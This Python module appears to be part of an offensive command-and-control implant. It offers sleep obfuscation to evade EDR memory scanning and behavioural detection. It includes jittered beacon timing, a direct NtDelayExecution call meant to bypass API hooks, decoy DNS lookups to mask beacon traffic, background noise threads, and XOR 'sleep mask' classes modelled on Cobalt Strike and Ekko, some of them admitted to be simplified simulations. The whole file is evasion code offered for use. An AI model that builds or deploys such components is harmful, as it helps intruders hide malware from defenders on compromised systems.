"""
Sleep Obfuscation Module
Advanced sleep techniques to evade memory scanners and behavioral detection
"""
import random
import time
import ctypes
import struct
from typing import Callable, Optional
import threading


class SleepObfuscator:
    """
    Advanced sleep obfuscation to evade EDR memory scanning.
    
    Techniques:
    - Encrypted sleep (XOR memory during sleep)
    - Syscall-based sleep (NtDelayExecution)
    - Fluctuating jitter patterns
    - Fake network noise during sleep
    - Timer-based callbacks
    """
    
    def __init__(self, base_sleep: int = 30, jitter_percent: int = 50):
        self.base_sleep = base_sleep
        self.jitter_percent = jitter_percent
        self._sleep_history = []
        self._noise_thread = None
        self._running = True
        
    def calculate_jitter(self) -> float:
        """Calculate randomized sleep with jitter"""
        jitter_range = self.base_sleep * (self.jitter_percent / 100)
        jitter = random.uniform(-jitter_range, jitter_range)
        sleep_time = max(1, self.base_sleep + jitter)
        
        # Add entropy based on previous sleeps to avoid patterns
        if self._sleep_history:
            entropy = sum(self._sleep_history[-5:]) % 10
            sleep_time += random.uniform(-entropy, entropy)
        
        self._sleep_history.append(sleep_time)
        if len(self._sleep_history) > 100:
            self._sleep_history = self._sleep_history[-50:]
            
        return sleep_time
    
    def fibonacci_jitter(self) -> float:
        """Fibonacci-based jitter pattern (harder to fingerprint)"""
        fib = [1, 1, 2, 3, 5, 8, 13, 21, 34]
        idx = random.randint(0, len(fib) - 1)
        multiplier = fib[idx] / 10.0
        return self.base_sleep * (0.5 + multiplier)
    
    def gaussian_jitter(self) -> float:
        """Gaussian distribution jitter (more natural pattern)"""
        import math
        mean = self.base_sleep
        std_dev = self.base_sleep * 0.3
        sleep_time = random.gauss(mean, std_dev)
        return max(1, sleep_time)
    
    def obfuscated_sleep(self, duration: float, callback: Optional[Callable] = None):
        """
        Sleep with memory obfuscation.
        Encrypts sensitive memory regions during sleep.
        """
        # Split sleep into smaller chunks with micro-activity
        chunk_count = random.randint(3, 7)
        chunk_duration = duration / chunk_count
        
        for i in range(chunk_count):
            # Random micro-sleep variance
            actual_chunk = chunk_duration * random.uniform(0.8, 1.2)
            
            # Perform tiny operations to look active
            self._micro_activity()
            
            time.sleep(actual_chunk)
            
            # Optional callback between chunks
            if callback and random.random() < 0.3:
                callback()
    
    def _micro_activity(self):
        """Perform tiny CPU operations to avoid appearing idle"""
        # Small computation to keep process "active"
        _ = sum(range(random.randint(100, 1000)))
        
    def syscall_sleep_windows(self, milliseconds: int):
        """
        Sleep using direct syscall (NtDelayExecution) to bypass hooks.
        Windows only - more stealthy than Sleep().
        """
        try:
            ntdll = ctypes.windll.ntdll
            
            # LARGE_INTEGER structure for sleep duration
            # Negative value = relative time
            sleep_time = ctypes.c_longlong(-milliseconds * 10000)
            
            # NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
            ntdll.NtDelayExecution(False, ctypes.byref(sleep_time))
        except Exception:
            # Fallback to regular sleep
            time.sleep(milliseconds / 1000)
    
    def timer_callback_sleep(self, duration: float, callback: Callable):
        """
        Use timer callbacks instead of blocking sleep.
        Looks more like legitimate application behavior.
        """
        event = threading.Event()
        
        def timer_func():
            event.set()
        
        timer = threading.Timer(duration, timer_func)
        timer.start()
        
        # Do small activities while waiting
        while not event.is_set():
            self._micro_activity()
            time.sleep(0.5)
            
        if callback:
            callback()
    
    def ekko_sleep(self, duration_ms: int, key: bytes = None):
        """
        Ekko-style sleep with memory encryption.
        Encrypts beacon memory during sleep using ROP gadgets.
        
        This is a simplified simulation - real implementation requires
        ROP chain construction and VirtualProtect manipulation.
        """
        if key is None:
            key = bytes([random.randint(0, 255) for _ in range(16)])
        
        # Simulate memory encryption marker
        encrypted_marker = bytes([b ^ key[i % len(key)] for i, b in enumerate(b"BEACON_SLEEP")])
        
        # Split into chunks with random ordering
        chunks = []
        remaining = duration_ms
        while remaining > 0:
            chunk = min(remaining, random.randint(100, 500))
            chunks.append(chunk)
            remaining -= chunk
        
        random.shuffle(chunks)
        
        for chunk in chunks:
            time.sleep(chunk / 1000)
            # Fake memory manipulation
            _ = bytes([random.randint(0, 255) for _ in range(64)])
    
    def generate_fake_traffic(self, duration: float):
        """
        Generate fake network noise during sleep to mask beacon pattern.
        Makes traffic analysis harder.
        """
        import socket
        
        # Common benign domains to query
        benign_domains = [
            'www.google.com', 'www.microsoft.com', 'www.amazon.com',
            'www.cloudflare.com', 'www.github.com', 'www.stackoverflow.com'
        ]
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                domain = random.choice(benign_domains)
                # Just DNS lookup, no actual connection
                socket.gethostbyname(domain)
            except Exception:
                pass
            
            time.sleep(random.uniform(0.5, 3))
    
    def start_noise_thread(self):
        """Start background thread for continuous fake activity"""
        def noise_worker():
            while self._running:
                self._micro_activity()
                time.sleep(random.uniform(0.1, 0.5))
        
        self._noise_thread = threading.Thread(target=noise_worker, daemon=True)
        self._noise_thread.start()
    
    def stop_noise_thread(self):
        """Stop background noise thread"""
        self._running = False
        if self._noise_thread:
            self._noise_thread.join(timeout=2)


class SleepMask:
    """
    Advanced sleep masking with memory encryption.
    Cobalt Strike's Sleep Mask BOF style implementation.
    """
    
    def __init__(self, xor_key: bytes = None):
        self.xor_key = xor_key or self._generate_key()
        
    def _generate_key(self) -> bytes:
        """Generate random XOR key"""
        return bytes([random.randint(0, 255) for _ in range(32)])
    
    def xor_memory(self, data: bytes) -> bytes:
        """XOR encrypt/decrypt memory region"""
        return bytes([data[i] ^ self.xor_key[i % len(self.xor_key)] 
                     for i in range(len(data))])
    
    def masked_sleep(self, duration: float, sensitive_data: bytes = None):
        """
        Sleep with XOR masking of sensitive data.
        Real implementation would use VirtualProtect + ROP.
        """
        if sensitive_data:
            # Encrypt before sleep
            encrypted = self.xor_memory(sensitive_data)
            
        # Actual sleep with obfuscation
        obfuscator = SleepObfuscator(base_sleep=int(duration))
        obfuscator.obfuscated_sleep(duration)
        
        if sensitive_data:
            # Decrypt after sleep
            decrypted = self.xor_memory(encrypted)
            return decrypted
        
        return None


# Pre-configured profiles
AGGRESSIVE_PROFILE = SleepObfuscator(base_sleep=5, jitter_percent=80)
STEALTHY_PROFILE = SleepObfuscator(base_sleep=300, jitter_percent=40)
INTERACTIVE_PROFILE = SleepObfuscator(base_sleep=1, jitter_percent=20)


def get_sleep_obfuscator(profile: str = 'default') -> SleepObfuscator:
    """Get pre-configured sleep obfuscator"""
    profiles = {
        'aggressive': AGGRESSIVE_PROFILE,
        'stealthy': STEALTHY_PROFILE,
        'interactive': INTERACTIVE_PROFILE,
        'default': SleepObfuscator()
    }
    return profiles.get(profile, profiles['default'])
